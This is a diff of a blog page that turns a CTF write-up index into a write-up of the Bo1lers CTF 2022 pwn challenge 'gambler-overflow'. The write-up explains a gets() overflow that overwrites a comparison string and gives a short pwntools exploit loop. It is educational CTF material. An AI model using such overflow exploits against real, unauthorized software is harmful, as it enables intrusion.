@@ -21,19 +21,19 @@
     var CONFIG = {"hostname":"www.aynakeya.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="pwn gerenal return to dl resolve (ret2dlresolve)  2022 bo1lers ctf 2022 tamu ctf 2022 line ctf 2022 [web] gotm   ut ctf 2022 Malformed Query smol   magpie ctf 2022 our file belong to us   maple ctf 20">
+  <meta name="description" content="0x0 IntroductionFeeling luuuuuuuucky? You must create a flag.txt in the same folder as the binary for it to run.nc ctf.b01lers.com 9203 Author: robotearthpizzaDifficulty: Easy files: gambler_overflow">
 <meta property="og:type" content="website">
-<meta property="og:title" content="ctf-writeup">
-<meta property="og:url" content="http://www.aynakeya.com/ctf-writeup/index.html">
+<meta property="og:title" content="[Pwn] gambler-overflow [Bo1lers CTF 2022]">
+<meta property="og:url" content="http://www.aynakeya.com/ctf-writeup/2022/bo1lers/pwn/gambler-overflow/index.html">
 <meta property="og:site_name" content="Aynakeya&#39;s Blog">
-<meta property="og:description" content="pwn gerenal return to dl resolve (ret2dlresolve)  2022 bo1lers ctf 2022 tamu ctf 2022 line ctf 2022 [web] gotm   ut ctf 2022 Malformed Query smol   magpie ctf 2022 our file belong to us   maple ctf 20">
+<meta property="og:description" content="0x0 IntroductionFeeling luuuuuuuucky? You must create a flag.txt in the same folder as the binary for it to run.nc ctf.b01lers.com 9203 Author: robotearthpizzaDifficulty: Easy files: gambler_overflow">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2022-03-07T19:25:27.000Z">
-<meta property="article:modified_time" content="2022-04-29T06:13:47.963Z">
+<meta property="article:published_time" content="2022-04-29T06:25:00.000Z">
+<meta property="article:modified_time" content="2022-04-29T06:38:42.223Z">
 <meta property="article:author" content="Aynakeya">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="http://www.aynakeya.com/ctf-writeup/">
+<link rel="canonical" href="http://www.aynakeya.com/ctf-writeup/2022/bo1lers/pwn/gambler-overflow/">
 
 
 <script id="page-configurations">
@@ -46,7 +46,7 @@
   };
 </script>
 
-  <title>ctf-writeup | Aynakeya's Blog
+  <title>[Pwn] gambler-overflow [Bo1lers CTF 2022] | Aynakeya's Blog
 </title>
   
 
@@ -215,11 +215,20 @@
     <div class="post-block" lang="zh-CN">
       <header class="post-header">
 
-<h1 class="post-title" itemprop="name headline">ctf-writeup
+<h1 class="post-title" itemprop="name headline">[Pwn] gambler-overflow [Bo1lers CTF 2022]
 </h1>
 
 <div class="post-meta">
   
+  <ul class="breadcrumb">
+          
+            <li><a href="/ctf-writeup/">CTF-WRITEUP</a></li>
+            <li><a href="/ctf-writeup/2022/">2022</a></li>
+            <li><a href="/ctf-writeup/2022/bo1lers/">BO1LERS</a></li>
+            <li><a href="/ctf-writeup/2022/bo1lers/pwn/">PWN</a></li>
+          <li>GAMBLER-OVERFLOW</li>
+        
+  </ul>
 
 </div>
 
@@ -229,57 +238,20 @@
       
       
       <div class="post-body">
-          <h1 id="pwn-gerenal"><a href="#pwn-gerenal" class="headerlink" title="pwn gerenal"></a>pwn gerenal</h1><ul>
-<li><a href="/2021/11/18/ret2-dl-resolve-example-silent-rop/">return to dl resolve (ret2dlresolve)</a></li>
-</ul>
-<h1 id="2022"><a href="#2022" class="headerlink" title="2022"></a>2022</h1><ul>
-<li><a href="./2022/bo1lers">bo1lers ctf 2022</a></li>
-<li><a href="./2022/tamuctf">tamu ctf 2022</a></li>
-<li>line ctf 2022<ul>
-<li><a href="/2022/03/28/ctfwriteup/linectf2022/line-ctf-2022-web-gotm-ssti/">[web] gotm</a></li>
-</ul>
-</li>
-<li>ut ctf 2022<ul>
-<li><a href="/2022/03/13/ctfwriteup/utctf2022/utctf2022-malformed-query-network/">Malformed Query</a></li>
-<li><a href="/2022/03/14/ctfwriteup/utctf2022/utctf2022-pwn-smol/">smol</a></li>
-</ul>
-</li>
-<li>magpie ctf 2022<ul>
-<li><a href="/2022/03/07/ctfwriteup/magpie2022/magpie-ctf-2020-writeup/">our file belong to us</a></li>
-</ul>
-</li>
-<li><a href="/2022/01/28/ctfwriteup/maplectf2022/maple-ctf-2022-write-up/">maple ctf 2022</a></li>
-</ul>
-<h1 id="2021"><a href="#2021" class="headerlink" title="2021"></a>2021</h1><ul>
-<li>seccon ctf<ul>
-<li><a href="/2021/12/12/ctfwriteup/secconctf2021/seccon-2021-write-up/#0x1-Web-vulnerabilities">vulnerabilities</a></li>
-<li><a href="/2021/12/12/ctfwriteup/secconctf2021/seccon-2021-write-up/#0x2-Misc-hitchhike">hitchhike</a></li>
-<li><a href="/2021/12/12/ctfwriteup/secconctf2021/seccon-2021-write-up/#0x3-Pwn-kasu-bof">kasu_bof</a></li>
-<li><a href="/2021/12/12/ctfwriteup/secconctf2021/seccon-2021-write-up/#0x4-pwn-average">average</a></li>
-</ul>
-</li>
-<li>hacker.lu ctf<ul>
-<li><a href="/2021/10/31/ctfwriteup/hackerluctf2021/hacker-lu-2021-secure-prototype/">secure prototype</a></li>
-</ul>
-</li>
-<li>bilibili ctf <ul>
-<li><a href="/2021/10/28/ctfwriteup/bilibilictf2021/bilibili-ctf-2021/">writeup</a></li>
-</ul>
-</li>
-<li>down under ctf<ul>
-<li><a href="/2021/10/09/ctfwriteup/ductf2021/ductf2021-pwn-babygame/">babygame</a></li>
-<li><a href="/2021/10/09/ctfwriteup/ductf2021/ductf2021-pwn-deadcode/">deadcode</a></li>
-<li><a href="/2021/10/09/ctfwriteup/ductf2021/ductf2021-pwn-leaking-like-a-sieve/">leaking like a sieve</a></li>
-<li><a href="/2021/10/09/ctfwriteup/ductf2021/ductf2021-pwn-outbackdoor/">out back door</a></li>
-<li><a href="/2021/10/09/ctfwriteup/ductf2021/ductf2021-pwn-oversight/">oversight</a></li>
-</ul>
-</li>
-<li>trendmicro ctf<ul>
-<li><a href="/2021/09/20/ctfwriteup/trendmicro2021/trendmicro-2021-osint2-400/">OSINT 400</a></li>
-<li><a href="/2021/09/20/ctfwriteup/trendmicro2021/trendmirco-2021-rev-1-100-pypuzzle/">PyPuzzle</a></li>
-</ul>
-</li>
-</ul>
+          <h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>Feeling luuuuuuuucky?</p>
+<p>You must create a flag.txt in the same folder as the binary for it to run.<br>nc ctf.b01lers.com 9203</p>
+<p>Author: robotearthpizza<br>Difficulty: Easy</p>
+<p>files: <a href="gambler_overflow">gambler_overflow</a></p>
+<h1 id="0x1-Mitigation"><a href="#0x1-Mitigation" class="headerlink" title="0x1 Mitigation"></a>0x1 Mitigation</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x2-Vulnerability"><a href="#0x2-Vulnerability" class="headerlink" title="0x2 Vulnerability"></a>0x2 Vulnerability</h1><p>function <code>sym.casino</code> ask for a 4 byte string using <code>gets</code>, then it compare with a random string generate by <code>sym.imp.rand()</code>. </p>
+<p>If we enter the same string as the random one, we get certain amount of money. If we have more than 1000 in balance, the program will print out the flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">│           ; var signed int64_t var_1ch @ rbp-0x1c</span><br><span class="line">│           ; var char *s2 @ rbp-0x18</span><br><span class="line">│           ; var char *s1 @ rbp-0x10</span><br><span class="line">│           ; var int64_t canary @ rbp-0x8</span><br><span class="line">&#123;</span><br><span class="line">    do &#123;</span><br><span class="line">        // generate random string</span><br><span class="line">        sym.imp.gets(&amp;s2);</span><br><span class="line">        iVar1 = sym.imp.strcmp(&amp;s1);</span><br><span class="line">        // add or subtract balance depend on the result</span><br><span class="line">    &#125; while (_obj.balance &lt; 1000);</span><br><span class="line">    sym.give_flag();</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>it uses <code>gets</code>, so we can overwrite s1 by s2. so that we can make s2 and s1 same.</p>
+<h1 id="0x3-Exploit"><a href="#0x3-Exploit" class="headerlink" title="0x3 Exploit"></a>0x3 Exploit</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line">try:</span><br><span class="line">    while True:</span><br><span class="line">        lp(io.sendlineafter(b&quot;letters: &quot;,b&quot;AAAAAAA\x00AAAAAAA\x00&quot;))</span><br><span class="line">except:</span><br><span class="line">    pass</span><br><span class="line">print(io.recv())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x4-Flag"><a href="#0x4-Flag" class="headerlink" title="0x4 Flag"></a>0x4 Flag</h1><p>forgot</p>
 
       </div>
       
@@ -287,6 +259,15 @@
       
     </div>
     
+  <ul class="breadcrumb">
+          
+            <li><a href="/ctf-writeup/">CTF-WRITEUP</a></li>
+            <li><a href="/ctf-writeup/2022/">2022</a></li>
+            <li><a href="/ctf-writeup/2022/bo1lers/">BO1LERS</a></li>
+            <li><a href="/ctf-writeup/2022/bo1lers/pwn/">PWN</a></li>
+          <li>GAMBLER-OVERFLOW</li>
+        
+  </ul>
 
     
     
@@ -341,7 +322,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn-gerenal"><span class="nav-number">1.</span> <span class="nav-text">pwn gerenal</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2022"><span class="nav-number">2.</span> <span class="nav-text">2022</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2021"><span class="nav-number">3.</span> <span class="nav-text">2021</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x0-Introduction"><span class="nav-number">1.</span> <span class="nav-text">0x0 Introduction</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x1-Mitigation"><span class="nav-number">2.</span> <span class="nav-text">0x1 Mitigation</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x2-Vulnerability"><span class="nav-number">3.</span> <span class="nav-text">0x2 Vulnerability</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x3-Exploit"><span class="nav-number">4.</span> <span class="nav-text">0x3 Exploit</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x4-Flag"><span class="nav-number">5.</span> <span class="nav-text">0x4 Flag</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
